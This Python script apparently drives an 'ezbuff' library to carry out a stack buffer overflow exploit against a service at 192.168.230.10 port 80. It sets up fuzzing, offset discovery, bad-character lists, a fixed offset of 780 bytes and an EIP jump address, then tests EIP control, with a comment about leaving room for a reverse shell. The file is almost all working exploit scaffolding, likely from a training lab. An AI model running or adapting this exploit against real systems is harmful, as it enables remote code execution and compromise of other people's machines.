#!/usr/bin/env python3

from ezbuff.src.overflow import Overflow

def main():
	# Instanstantiate `Overflow` object
	obj = Overflow("192.168.230.10", 80, max_fuzz_bytes=2000)
	# print(repr(obj), "\n")
	# print(obj)

	# Change the target IP if running in interactive Python interpreter
	# obj.targ_ip = "127.0.0.1"

	# Change the target port number if running objs in interactive Python interpreter
	# obj.targ_port = 443

	# The number of seconds to wait in between the fuzzing process,
	# default = 10
	# obj.fuzz_interval_seconds = 2

	# Set the increment of the fuzzer to be 150 as opposed to
	# the default of 100
	# obj.fuzz_increment = 150

	# Fuzz the vulnerable application
	# obj.fuzz()

	# Sets the number of bytes to crash the application.
	# Make sure to accomodate space for reverse shell!!
	obj.num_bytes_crash = 1200

	# Set the offset after running the functions to find offset value
	obj.offset = 780

	# Add bad characters to objects list containing bad characters found
	# after sending characters payload.
	# obj.add_bad_char("\x00", "\x0a", "\x0d", "\x25", "\x26", "\x2b", "\x3d")

	# Send payload with characters to find bad characters.
	# obj.send_bad_chars()

	# Sending pattern to determine offset
	# obj.send_pattern()

	# Get offset 
	# obj.get_offset("30416B30")

	# Set the memory address to jump to after finding valid memory address
	# containing `jump` instructions set in x86 architecture
	obj.jump_eip = "\x83\x0c\x09\x10"
	obj.test("eip")

if __name__ == '__main__':
	main()
